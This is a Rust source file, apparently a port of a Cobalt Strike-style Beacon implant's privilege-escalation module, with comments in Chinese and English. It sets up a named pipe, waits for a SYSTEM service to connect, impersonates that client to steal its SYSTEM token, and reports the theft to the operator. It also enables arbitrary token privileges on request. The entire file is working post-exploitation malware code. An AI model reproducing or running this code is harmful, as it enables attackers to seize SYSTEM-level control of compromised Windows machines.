//! 提权代码（elevate.cpp）。
//! Privilege escalation code (elevate.cpp).

use crate::bformat::FormatP;
use crate::callback::{post_error_d, post_error_na, Callback};
use crate::commands::CALLBACK_TOKEN_STOLEN;
use crate::parse::DataP;
use crate::state;
use crate::thread::run_thread_start;
use crate::tokens::token_user;
use parking_lot::Mutex;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::Security::{
    AdjustTokenPrivileges, ImpersonateLoggedOnUser, LookupPrivilegeValueA,
    SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_ALL_ACCESS, TOKEN_PRIVILEGES,
};
use windows_sys::Win32::System::Threading::OpenThreadToken;
use windows_sys::Win32::Storage::FileSystem::PIPE_ACCESS_DUPLEX;
use windows_sys::Win32::System::Pipes::CreateNamedPipeA;
use windows_sys::Win32::System::Pipes::{
    ConnectNamedPipe, DisconnectNamedPipe, ImpersonateNamedPipeClient,
    PIPE_TYPE_MESSAGE, PIPE_WAIT,
};
use windows_sys::Win32::System::Threading::{GetCurrentThread, WaitForSingleObject};
use windows_sys::Win32::Storage::FileSystem::ReadFile;
use windows_sys::Win32::Foundation::ERROR_PIPE_CONNECTED;
use windows_sys::Win32::Foundation::ERROR_SUCCESS;

static H_SERVER_PIPE: Mutex<isize> = Mutex::new(-1);
static SYSTEM_TOKEN: Mutex<isize> = Mutex::new(-1);
static H_ELEVATE_THREAD: Mutex<isize> = Mutex::new(-1);

/// 用于命名管道模拟的工作线程。
/// Worker thread for named pipe impersonation.
fn elevate_thread() {
    let mut b_message = [0u8; 128];
    let mut dw_bytes: u32 = 0;

    let pipe = *H_SERVER_PIPE.lock();

    // 等待有人连接到我们的命名管道
    // wait for someone to connect to our named pipe
    unsafe {
        loop {
            if ConnectNamedPipe(pipe as HANDLE, std::ptr::null_mut()) == 0 {
                if GetLastError() == ERROR_PIPE_CONNECTED {
                    break;
                }
            } else {
                break;
            }
        }

        // 在从管道读取数据之前无法模拟客户端
        // we can't impersonate a client until we read data from the pipe
        if ReadFile(pipe as HANDLE, b_message.as_mut_ptr() as *mut _, 1, &mut dw_bytes, std::ptr::null_mut()) == 0 {
            state::THREAD_COUNT.fetch_sub(1, std::sync::atomic::Ordering::SeqCst);
            return;
        }

        // 模拟连接到我们的客户端（通过服务以 SYSTEM 用户身份）
        // impersonate the client that connected to us (SYSTEM user via service)
        if ImpersonateNamedPipeClient(pipe as HANDLE) == 0 {
            state::THREAD_COUNT.fetch_sub(1, std::sync::atomic::Ordering::SeqCst);
            return;
        }

        // 从当前线程获取 SYSTEM 令牌
        // grab the SYSTEM token from our current thread
        let mut token: HANDLE = std::ptr::null_mut();
        if OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, 0, &mut token) != 0 {
            *SYSTEM_TOKEN.lock() = token as isize;
        }

        // 现在做一些清理工作
        // do some cleanup now
        if pipe != -1 {
            DisconnectNamedPipe(pipe as HANDLE);
            CloseHandle(pipe as HANDLE);
        }
    }

    // 递减我们的线程计数
    // decrement our threadcount
    state::THREAD_COUNT.fetch_sub(1, std::sync::atomic::Ordering::SeqCst);
}

fn getprivs(buffer: &[u8], length: usize, token: isize, output: &mut FormatP) {
    let mut parser = DataP::init(&mut buffer.to_vec());
    let count = parser.data_short();

    for _ in 0..count {
        let mut priv_name = [0u8; 64];
        if parser.data_string(&mut priv_name, 64) == 0 {
            break;
        }
        let n = priv_name.iter().position(|&c| c == 0).unwrap_or(64);

        let mut priv_: TOKEN_PRIVILEGES = unsafe { std::mem::zeroed() };
        let mut pn = priv_name[..n].to_vec();
        pn.push(0);
        unsafe {
            // 将用户指定的特权名映射为对应的 LUID 值
            // map the user specified privname to a value
            if LookupPrivilegeValueA(std::ptr::null(), pn.as_ptr() as *const _, &mut priv_.Privileges[0].Luid) == 0 {
                continue;
            }
            priv_.PrivilegeCount = 1;
            priv_.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if AdjustTokenPrivileges(token as HANDLE, 0, &priv_, 0, std::ptr::null_mut(), std::ptr::null_mut()) != 0 {
                if GetLastError() == ERROR_SUCCESS {
                    output.bformat_printf(format_args!("{}\n", String::from_utf8_lossy(&priv_name[..n])));
                }
            }
        }
    }
}

/// 创建一个命名管道服务器 + 为其服务的线程（elevate_pre）。
/// Create a named pipe server + thread that services it (elevate_pre).
pub fn command_elevate_pre(buffer: &[u8], length: usize) {
    if length >= 256 {
        return;
    }
    let mut c_service_pipe = buffer.to_vec();
    c_service_pipe.push(0);

    // 重置我们的状态
    // reset our state
    *SYSTEM_TOKEN.lock() = -1;
    *H_SERVER_PIPE.lock() = -1;
    *H_ELEVATE_THREAD.lock() = -1;

    // 创建我们的管道
    // create our pipe
    unsafe {
        let h = CreateNamedPipeA(
            c_service_pipe.as_ptr() as *const _,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_WAIT,
            2,
            0,
            0,
            0,
            std::ptr::null(),
        );
        *H_SERVER_PIPE.lock() = h as isize;
        if h.is_null() {
            return;
        }
    }

    // 派生一个线程等待管道连接
    // spawn a thread to wait for a connection to the pipe
    run_thread_start(elevate_thread);
}

/// 我们的提权后置步骤。
/// Our elevate post step.
pub fn command_elevate_post(callback: Callback) {
    let h_thread = *H_ELEVATE_THREAD.lock();
    // 等待提权线程完成（最多 15 秒）
    // wait for our elevate thread to complete (up to 15s)
    if h_thread != -1 {
        unsafe {
            WaitForSingleObject(h_thread as HANDLE, 15000);
        }
    }

    let system_token = *SYSTEM_TOKEN.lock();
    if system_token != -1 {
        // 尝试在当前线程中使用 SYSTEM 令牌
        // try to use the SYSTEM token in the current thread
        unsafe {
            if ImpersonateLoggedOnUser(system_token as HANDLE) == 0 {
                post_error_d(0xc, GetLastError() as i32);
                return;
            }
        }
        state::set_atoken(system_token);

        // 解析令牌的用户名……闹着玩的
        // resolve the token's name... for giggles
        let mut name = [0u8; 512];
        if token_user(system_token, &mut name) {
            let n = name.iter().position(|&c| c == 0).unwrap_or(512);
            callback(&name[..n], n as i32, CALLBACK_TOKEN_STOLEN);
        }
    } else {
        post_error_na(0x01);
    }
}

/// 这是 64 位还是 32 位进程（is_wow64）？
/// Is this a 64-bit or 32-bit process (is_wow64)?
pub fn is_wow64(process: isize) -> bool {
    unsafe {
        let kernel32 = GetModuleHandleA(c"kernel32".as_ptr().cast());
        if kernel32.is_null() {
            return false;
        }
        let function = GetProcAddress(kernel32, c"IsWow64Process".as_ptr().cast());
        let Some(function) = function else {
            return false;
        };
        let f: unsafe extern "system" fn(HANDLE, *mut i32) -> i32 = std::mem::transmute(function);
        let mut b_is_wow64: i32 = 0;
        if f(process as HANDLE, &mut b_is_wow64) == 0 {
            return false;
        }
        b_is_wow64 != 0
    }
}

/// 是否为 x64 Beacon？（本移植版本面向 x64。）
/// Is this an x64 Beacon or not? (The port targets x64.)
pub fn is_x64() -> bool {
    true
}

/// 启用某个特定特权（command_getprivs）。
/// Enable a specific privilege (command_getprivs).
pub fn command_getprivs(buffer: &[u8], length: usize, callback: Callback) {
    let mut format = FormatP::init(1024);
    let mut parser = DataP::init(&mut buffer.to_vec());
    let reqid = parser.data_int();
    format.bformat_int(reqid as i32);

    let mut token: HANDLE = std::ptr::null_mut();
    unsafe {
        if OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES, 0, &mut token) == 0 {
            let _ = windows_sys::Win32::System::Threading::OpenProcessToken(
                windows_sys::Win32::System::Threading::GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES,
                &mut token,
            );
        }
    }

    let rest = parser.data_buffer();
    getprivs(rest, parser.data_length(), token as isize, &mut format);

    if !token.is_null() {
        unsafe { CloseHandle(token) };
    }

    let data = format.bformat_string().to_vec();
    let len = format.bformat_length();
    callback(&data, len as i32, crate::commands::CALLBACK_PENDING);
    format.free();
}
